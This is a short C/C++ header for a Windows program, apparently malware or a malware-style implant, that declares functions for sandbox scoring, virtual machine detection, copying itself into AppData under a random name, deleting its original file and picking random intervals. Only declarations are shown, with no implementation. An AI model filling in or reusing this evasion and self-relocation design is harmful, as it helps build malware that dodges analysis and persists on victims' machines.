#pragma once

#include <Windows.h>
#include <stdio.h>
#include <random>
#include <ctime>
#include <string.h>
#include <intrin.h>
#include <shlobj.h> // get AppData path

// sanbox's score: min
#define SANDBOX_THRESHOLD 3

BOOL GetEncryptedMachineGUID(const WCHAR* encryptedMachineGuid, DWORD size);
BOOL IsFirstTime();
BOOL IsVmProcessRunning();
BOOL IsRunningInVM();
WCHAR* GenerateRandomFileName();
BOOL CopyToAppData(const WCHAR* currentPath, WCHAR* newPath);
BOOL DeleteOrigin(const WCHAR* originPath);
DWORD GetRandomInterval(DWORD minSeconds, DWORD maxSeconds);
VOID EscapeJsonString(const char* input, char* output, DWORD outputSize);
VOID WStringToString(const WCHAR* wStr, char* str, DWORD size);

